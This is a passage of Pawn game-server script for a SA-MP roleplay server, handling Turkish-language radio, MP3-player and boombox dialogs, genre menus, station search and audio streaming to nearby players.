    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_RADIOMENU_PLAY, DIALOG_STYLE_LIST, "Radyo istasyonlarý - Reggae", stringg, "Oynat", "Iptal");
			}
			if(listitem == 20)
			{
				for(new r = 200; r < 210; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_RADIOMENU_PLAY, DIALOG_STYLE_LIST, "Radyo istasyonlarý - Rock", stringg, "Oynat", "Iptal");
			}
			if(listitem == 21)
			{
				for(new r = 210; r < 220; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_RADIOMENU_PLAY, DIALOG_STYLE_LIST, "Radyo istasyonlarý - Sohbet", stringg, "Oynat", "Iptal");
			}
			// CURRENTLY NO HOLIDAYS
			/*if(listitem == 24)
			{
                ShowPlayerDialogEx(playerid, DIALOG_RADIOMENU_SEASON, DIALOG_STYLE_LIST, "Radyo istasyonlarý - Seasonal/Holiday", "", "Oynat", "Iptal");
			}*/
		}
	}
	else if(dialogid == DIALOG_RADIOMENU_PLAY)
	{
		if(response)
		{
		    new t = ListItemTrackId[playerid][listitem];
			new radiovehicle = GetPlayerVehicleID(playerid);

			if(VehicleRadioStation[radiovehicle] == t+1)
			{
   				SendClientMessage(playerid, COLOR_GRAD1, "Bu araçtaki radyo istasyonu zaten o.");
				return 1;
			}

			format(string, sizeof(string), "* %s radyo istasyonunu %s olarak deðiþtirdi.", GetPlayerNameEx(playerid), VehicleRadioListing[t][radioname]);
			ProxDetector(25.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			VehicleRadioStation[radiovehicle] = t+1;
  			PlayAudioStreamForPlayer(playerid, VehicleRadioListing[t][radiourl]);

			foreach(Player, i)
			{
  				if(GetPlayerVehicleID(i) == radiovehicle && IsPlayerInAnyVehicle(i) && GetPlayerState(i) == PLAYER_STATE_PASSENGER && i != playerid)
	    		{
      				PlayAudioStreamForPlayer(i, VehicleRadioListing[t][radiourl]);
		    	}
			}
		}
	}
	if(dialogid == DIALOG_MP3_START)
	{
		if(response)
		{
			if(listitem == 0)
			{
  				if(MP3Station[playerid] == 0)
  				{
  				    SendClientMessage(playerid, COLOR_GRAD1, "MP3 oynatýcýn zaten kapalý.");
					return 1;
  				}

				format(string, sizeof(string), "* %s MP3 oynatýcýsýný baþlattý.", GetPlayerNameEx(playerid));
				ProxDetector(25.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);

			    MP3Station[playerid] = 0;
       			StopAudioStreamForPlayer(playerid);
			}
			if(listitem == 1)
			{
				ShowPlayerDialogEx(playerid, DIALOG_MP3_SEARCH, DIALOG_STYLE_INPUT, "MP3 Oynatýcý - Radyo Ara", "Aramak istediðin radyo istasyonunu gir.\n\nUyarý: Aramak için minimum 3 karakter girmelisin.", "Ara", "Iptal");
			}
			if(listitem == 2)
			{
				ShowPlayerDialogEx(playerid, DIALOG_MP3_GENRE, DIALOG_STYLE_LIST, "MP3 Oynatýcý - Tür seç", "Alternatif\nHüzün\nKlasik\nÞehir\nYýl\nDinlemesi Kolay\nElektronik\nHalk\nÝlhamverici\nEvrensel\nJazz\nLatin\nMetal\nMisc\nYeni Yýl\nPop\nHerkese Açýk Radyo\nR&B/Urban\nRap\nReggae\nRock\nSohbet", "Seç", "Iptal");
			}
		}
	}
	if(dialogid == DIALOG_MP3_SEARCH)
	{
		if(response)
		{
 			if(strlen(inputtext) < 3)
	    	{
	        	ShowPlayerDialogEx(playerid, DIALOG_MP3_SEARCH, DIALOG_STYLE_INPUT, "MP3 Oynatýcý - Radyo Ara", "ÝÇERÝK REDDEDÝLDÝ: Arama yapmak için minimum 3 karakter girmelisin.\n\nAramak istediðin radyo istasyonunu gir.\n\nUyarý: Minimum 3 karakter olmalý.", "Ara", "Iptal");
	    	}
	    	else
	    	{
	    	    for(new x; x < 50; ++x) ListItemTrackId[playerid][x] = -1;

    			new stringg[512], name[32], search[128], iCount;

    			strcat(search, inputtext, sizeof(search));

				for (new i=0; i<220; i++)
				{
					if(strfind(VehicleRadioListing[i][radioname], search, true) != -1 && iCount < 50)
					{
            			format(name, sizeof(name), "%s", VehicleRadioListing[i][radioname]);
						format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
						ListItemTrackId[playerid][iCount++] = i;
					}
				}
				if(iCount == 0)
				{
				    ShowPlayerDialogEx(playerid, DIALOG_MP3_SEARCH, DIALOG_STYLE_INPUT, "MP3 Oynatýcý - Radyo Ara", "ARAMA BAÞARISIZ: Aranan radyo istasyonu bulunamadý.\n\nAramak istediðin istasyonu gir.\n\nUyarý: 3 karakterden az olmamalý.", "Ara", "Iptal");
				}
				else
				{
					ShowPlayerDialogEx(playerid, DIALOG_MP3_SEARCHLIST, DIALOG_STYLE_LIST, "MP3 Oynatýcý - Arama Sonuçlarý", stringg, "Oynat", "Iptal");
				}
			}
	    }
 	}
	if(dialogid == DIALOG_MP3_SEARCHLIST)
	{
		if(response)
		{
			new t = ListItemTrackId[playerid][listitem];

			format(string, sizeof(string), "* %s,MP3 Player'inden % istasyonunu açtý.", GetPlayerNameEx(playerid), VehicleRadioListing[t][radioname]);
			ProxDetector(25.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			MP3Station[playerid] = t+1;
  			PlayAudioStreamForPlayer(playerid, VehicleRadioListing[t][radiourl]);
		}
	}
	if(dialogid == DIALOG_MP3_GENRE)
	{
		if(response)
		{
			new stringg[321], name[32], iCount;

			for(new x; x < 50; ++x) ListItemTrackId[playerid][x] = -1;

			if(listitem == 0)
			{
			    for(new r = 0; r < 10; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_MP3_PLAY, DIALOG_STYLE_LIST, "MP3 Oynatýcý - Alternatif", stringg, "Oynat", "Iptal");
			}
			if(listitem == 1)
			{
   				for(new r = 10; r < 20; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_MP3_PLAY, DIALOG_STYLE_LIST, "MP3 Oynatýcý - Hüzün", stringg, "Oynat", "Iptal");
			}
			if(listitem == 2)
			{
   				for(new r = 20; r < 30; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_MP3_PLAY, DIALOG_STYLE_LIST, "MP3 Oynatýcý - Klasik", stringg, "Oynat", "Iptal");
			}
			if(listitem == 3)
			{
   				for(new r = 30; r < 40; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_MP3_PLAY, DIALOG_STYLE_LIST, "MP3 Oynatýcý - Þehir", stringg, "Oynat", "Iptal");
			}
			if(listitem == 4)
			{
   				for(new r = 40; r < 50; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_MP3_PLAY, DIALOG_STYLE_LIST, "MP3 Oynatýcý - Yýl", stringg, "Oynat", "Iptal");
			}
			if(listitem == 5)
			{
   				for(new r = 50; r < 60; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_MP3_PLAY, DIALOG_STYLE_LIST, "MP3 Oynatýcý - Dinlemesi Kolay", stringg, "Oynat", "Iptal");
			}
			if(listitem == 6)
			{
   				for(new r = 60; r < 70; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_MP3_PLAY, DIALOG_STYLE_LIST, "MP3 Oynatýcý - Elektronik", stringg, "Oynat", "Iptal");
			}
			if(listitem == 7)
			{
   				for(new r = 70; r < 80; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_MP3_PLAY, DIALOG_STYLE_LIST, "MP3 Oynatýcý - Halk", stringg, "Oynat", "Iptal");
			}
			if(listitem == 8)
			{
   				for(new r = 80; r < 90; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_MP3_PLAY, DIALOG_STYLE_LIST, "MP3 Oynatýcý - Ýlhamverici", stringg, "Oynat", "Iptal");
			}
			if(listitem == 9)
			{
   				for(new r = 90; r < 100; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_MP3_PLAY, DIALOG_STYLE_LIST, "MP3 Oynatýcý - Evrensel", stringg, "Oynat", "Iptal");
			}
			if(listitem == 10)
			{
   				for(new r = 100; r < 110; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_MP3_PLAY, DIALOG_STYLE_LIST, "MP3 Oynatýcý - Jazz", stringg, "Oynat", "Iptal");
			}
			if(listitem == 11)
			{
				for(new r = 110; r < 120; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_MP3_PLAY, DIALOG_STYLE_LIST, "MP3 Oynatýcý - Latin", stringg, "Oynat", "Iptal");
			}
			if(listitem == 12)
			{
				for(new r = 120; r < 130; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_MP3_PLAY, DIALOG_STYLE_LIST, "MP3 Oynatýcý - Metal", stringg, "Oynat", "Iptal");
			}
			if(listitem == 13)
			{
				for(new r = 130; r < 140; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_MP3_PLAY, DIALOG_STYLE_LIST, "MP3 Oynatýcý - Misc", stringg, "Oynat", "Iptal");
			}
			if(listitem == 14)
			{
				for(new r = 140; r < 150; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_MP3_PLAY, DIALOG_STYLE_LIST, "MP3 Oynatýcý - Yeni Yýl", stringg, "Oynat", "Iptal");
			}
			if(listitem == 15)
			{
				for(new r = 150; r < 160; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_MP3_PLAY, DIALOG_STYLE_LIST, "MP3 Oynatýcý - Pop", stringg, "Oynat", "Iptal");
			}
			if(listitem == 16)
			{
				for(new r = 160; r < 170; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_MP3_PLAY, DIALOG_STYLE_LIST, "MP3 Oynatýcý - Herkese Açýk Radyo", stringg, "Oynat", "Iptal");
			}
			if(listitem == 17)
			{
				for(new r = 170; r < 180; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_MP3_PLAY, DIALOG_STYLE_LIST, "MP3 Oynatýcý - R&B/Urban", stringg, "Oynat", "Iptal");
			}
			if(listitem == 18)
			{
				for(new r = 180; r < 190; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_MP3_PLAY, DIALOG_STYLE_LIST, "MP3 Oynatýcý - Rap", stringg, "Oynat", "Iptal");
			}
			if(listitem == 19)
			{
				for(new r = 190; r < 200; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_MP3_PLAY, DIALOG_STYLE_LIST, "MP3 Oynatýcý - Reggae", stringg, "Oynat", "Iptal");
			}
			if(listitem == 20)
			{
				for(new r = 200; r < 210; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_MP3_PLAY, DIALOG_STYLE_LIST, "MP3 Oynatýcý - Rock", stringg, "Oynat", "Iptal");
			}
			if(listitem == 21)
			{
				for(new r = 210; r < 220; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_MP3_PLAY, DIALOG_STYLE_LIST, "MP3 Oynatýcý - Sohbet", stringg, "Oynat", "Iptal");
			}
			// CURRENTLY NO HOLIDAYS
			/*if(listitem == 24)
			{
                ShowPlayerDialogEx(playerid, DIALOG_MP3_SEASON, DIALOG_STYLE_LIST, "MP3 Oynatýcý - Seasonal/Holiday", "", "Oynat", "Iptal");
			}*/
		}
	}
	else if(dialogid == DIALOG_MP3_PLAY)
	{
		if(response)
		{
			new t = ListItemTrackId[playerid][listitem];

			format(string, sizeof(string), "* %s,MP3 Player'inden % istasyonunu açtý.", GetPlayerNameEx(playerid), VehicleRadioListing[t][radioname]);
			ProxDetector(25.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			MP3Station[playerid] = t+1;
  			PlayAudioStreamForPlayer(playerid, VehicleRadioListing[t][radiourl]);
		}
	}
	if(dialogid == DIALOG_BOOMBOX_START)
	{
		if(response)
		{
			if(listitem == 0)
			{
				ShowPlayerDialogEx(playerid, DIALOG_BOOMBOX_SEARCH, DIALOG_STYLE_INPUT, "Boombox - Radyo Arama", "Aramak istediðin radyo istasyonunu gir.\n\nUyarý: Aramak için minimum 3 karakter girmelisin.", "Ara", "Iptal");
			}
			if(listitem == 1)
			{
				ShowPlayerDialogEx(playerid, DIALOG_BOOMBOX_GENRE, DIALOG_STYLE_LIST, "Boombox - Tür seçin", "Alternatif\nHüzün\nKlasik\nÞehir\nYýl\nDinlemesi Kolay\nElektronik\nHalk\nÝlhamverici\nEvrensel\nJazz\nLatin\nMetal\nMisc\nYeni Yýl\nPop\nHerkese Açýk Radyo\nR&B/Urban\nRap\nReggae\nRock\nSohbet", "Seç", "Iptal");
			}
		}
	}
	if(dialogid == DIALOG_BOOMBOX_SEARCH)
	{
		if(response)
		{
 			if(strlen(inputtext) < 3)
	    	{
	        	ShowPlayerDialogEx(playerid, DIALOG_BOOMBOX_SEARCH, DIALOG_STYLE_INPUT, "Boombox - Radyo Arama", "ÝÇERÝK REDDEDÝLDÝ: Arama yapmak için minimum 3 karakter girmelisin.\n\nAramak istediðin radyo istasyonunu gir.\n\nUyarý: Minimum 3 karakter olmalý.", "Ara", "Iptal");
	    	}
	    	else
	    	{
	    	    for(new x; x < 50; ++x) ListItemTrackId[playerid][x] = -1;

    			new stringg[512], name[32], search[128], iCount;

    			strcat(search, inputtext, sizeof(search));

				for (new i=0; i<220; i++)
				{
					if(strfind(VehicleRadioListing[i][radioname], search, true) != -1 && iCount < 50)
					{
            			format(name, sizeof(name), "%s", VehicleRadioListing[i][radioname]);
						format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
						ListItemTrackId[playerid][iCount++] = i;
					}
				}
				if(iCount == 0)
				{
				    ShowPlayerDialogEx(playerid, DIALOG_BOOMBOX_SEARCH, DIALOG_STYLE_INPUT, "Boombox - Radyo Arama", "ARAMA BAÞARISIZ: Aranan radyo istasyonu bulunamadý.\n\nAramak istediðin istasyonu gir.\n\nUyarý: 3 karakterden az olmamalý.", "Ara", "Iptal");
				}
				else
				{
					ShowPlayerDialogEx(playerid, DIALOG_BOOMBOX_SEARCHLIST, DIALOG_STYLE_LIST, "Boombox - Arama Sonuçlarý", stringg, "Oynat", "Iptal");
				}
			}
	    }
 	}
	if(dialogid == DIALOG_BOOMBOX_SEARCHLIST)
	{
		if(response)
		{
			new t = ListItemTrackId[playerid][listitem];

			format(string, sizeof(string), "* %s, boombox kanalýný %s olarak deðiþtirdi.", GetPlayerNameEx(playerid), VehicleRadioListing[t][radioname]);
			ProxDetector(25.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			BoomBoxSet[playerid] = 1;

        	GetPlayerPos(playerid, BoomboxInfo[playerid][bbPosX], BoomboxInfo[playerid][bbPosY], BoomboxInfo[playerid][bbPosZ]);
        	BoomboxInfo[playerid][bbInt] = GetPlayerInterior(playerid);
        	BoomboxInfo[playerid][bbVW] = GetPlayerVirtualWorld(playerid);
			BoomboxInfo[playerid][bbStation] = t+1;
			BoomboxInfo[playerid][bbSetBy] = playerid;

			ApplyAnimation(playerid,"BOMBER","BOM_Plant",4.0,0,0,0,0,0);
			ApplyAnimation(playerid,"BOMBER","BOM_Plant",4.0,0,0,0,0,0);
			BoomboxInfo[playerid][bbObject] = CreateDynamicObject(2103, BoomboxInfo[playerid][bbPosX], BoomboxInfo[playerid][bbPosY], BoomboxInfo[playerid][bbPosZ]-0.9, 0, 0, 0, BoomboxInfo[playerid][bbVW], BoomboxInfo[playerid][bbInt]);

       		foreach(Player, i)
			{
				if(IsPlayerInRangeOfPoint(i,150.0,BoomboxInfo[playerid][bbPosX],BoomboxInfo[playerid][bbPosY],BoomboxInfo[playerid][bbPosZ]) && GetPlayerInterior(i) == BoomboxInfo[playerid][bbInt] && GetPlayerVirtualWorld(i) == BoomboxInfo[playerid][bbVW])
				{
					PlayAudioStreamForPlayer(i, VehicleRadioListing[t][radiourl], BoomboxInfo[playerid][bbPosX], BoomboxInfo[playerid][bbPosY], BoomboxInfo[playerid][bbPosZ], 50.0, 1);
				}
			}
		}
	}
	if(dialogid == DIALOG_BOOMBOX_GENRE)
	{
		if(response)
		{
			new stringg[321], name[32], iCount;

			for(new x; x < 50; ++x) ListItemTrackId[playerid][x] = -1;

			if(listitem == 0)
			{
			    for(new r = 0; r < 10; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_BOOMBOX_PLAY, DIALOG_STYLE_LIST, "Boombox Alternatif", stringg, "Oynat", "Iptal");
			}
			if(listitem == 1)
			{
   				for(new r = 10; r < 20; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_BOOMBOX_PLAY, DIALOG_STYLE_LIST, "Boombox Hüzün", stringg, "Oynat", "Iptal");
			}
			if(listitem == 2)
			{
   				for(new r = 20; r < 30; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_BOOMBOX_PLAY, DIALOG_STYLE_LIST, "Boombox Klasik", stringg, "Oynat", "Iptal");
			}
			if(listitem == 3)
			{
   				for(new r = 30; r < 40; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_BOOMBOX_PLAY, DIALOG_STYLE_LIST, "Boombox Þehir", stringg, "Oynat", "Iptal");
			}
			if(listitem == 4)
			{
   				for(new r = 40; r < 50; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_BOOMBOX_PLAY, DIALOG_STYLE_LIST, "Boombox Yýl", stringg, "Oynat", "Iptal");
			}
			if(listitem == 5)
			{
   				for(new r = 50; r < 60; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_BOOMBOX_PLAY, DIALOG_STYLE_LIST, "Boombox Dinlemesi Kolay", stringg, "Oynat", "Iptal");
			}
			if(listitem == 6)
			{
   				for(new r = 60; r < 70; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_BOOMBOX_PLAY, DIALOG_STYLE_LIST, "Boombox Elektronik", stringg, "Oynat", "Iptal");
			}
			if(listitem == 7)
			{
   				for(new r = 70; r < 80; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_BOOMBOX_PLAY, DIALOG_STYLE_LIST, "Boombox Halk", stringg, "Oynat", "Iptal");
			}
			if(listitem == 8)
			{
   				for(new r = 80; r < 90; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_BOOMBOX_PLAY, DIALOG_STYLE_LIST, "Boombox Ýlhamverici", stringg, "Oynat", "Iptal");
			}
			if(listitem == 9)
			{
   				for(new r = 90; r < 100; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_BOOMBOX_PLAY, DIALOG_STYLE_LIST, "Boombox Evrensel", stringg, "Oynat", "Iptal");
			}
			if(listitem == 10)
			{
   				for(new r = 100; r < 110; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_BOOMBOX_PLAY, DIALOG_STYLE_LIST, "Boombox Jazz", stringg, "Oynat", "Iptal");
			}
			if(listitem == 11)
			{
				for(new r = 110; r < 120; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_BOOMBOX_PLAY, DIALOG_STYLE_LIST, "Boombox Latin", stringg, "Oynat", "Iptal");
			}
			if(listitem == 12)
			{
				for(new r = 120; r < 130; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_BOOMBOX_PLAY, DIALOG_STYLE_LIST, "Boombox Metal", stringg, "Oynat", "Iptal");
			}
			if(listitem == 13)
			{
				for(new r = 130; r < 140; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_BOOMBOX_PLAY, DIALOG_STYLE_LIST, "Boombox Misc", stringg, "Oynat", "Iptal");
			}
			if(listitem == 14)
			{
				for(new r = 140; r < 150; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_BOOMBOX_PLAY, DIALOG_STYLE_LIST, "Boombox Yeni Yýl", stringg, "Oynat", "Iptal");
			}
			if(listitem == 15)
			{
				for(new r = 150; r < 160; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_BOOMBOX_PLAY, DIALOG_STYLE_LIST, "Boombox Pop", stringg, "Oynat", "Iptal");
			}
			if(listitem == 16)
			{
				for(new r = 160; r < 170; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_BOOMBOX_PLAY, DIALOG_STYLE_LIST, "Boombox Herkese Acik Radyo", stringg, "Oynat", "Iptal");
			}
			if(listitem == 17)
			{
				for(new r = 170; r < 180; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_BOOMBOX_PLAY, DIALOG_STYLE_LIST, "Boombox R&B/Urban", stringg, "Oynat", "Iptal");
			}
			if(listitem == 18)
			{
				for(new r = 180; r < 190; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_BOOMBOX_PLAY, DIALOG_STYLE_LIST, "Boombox Rap", stringg, "Oynat", "Iptal");
			}
			if(listitem == 19)
			{
				for(new r = 190; r < 200; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_BOOMBOX_PLAY, DIALOG_STYLE_LIST, "Boombox Reggae", stringg, "Oynat", "Iptal");
			}
			if(listitem == 20)
			{
				for(new r = 200; r < 210; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
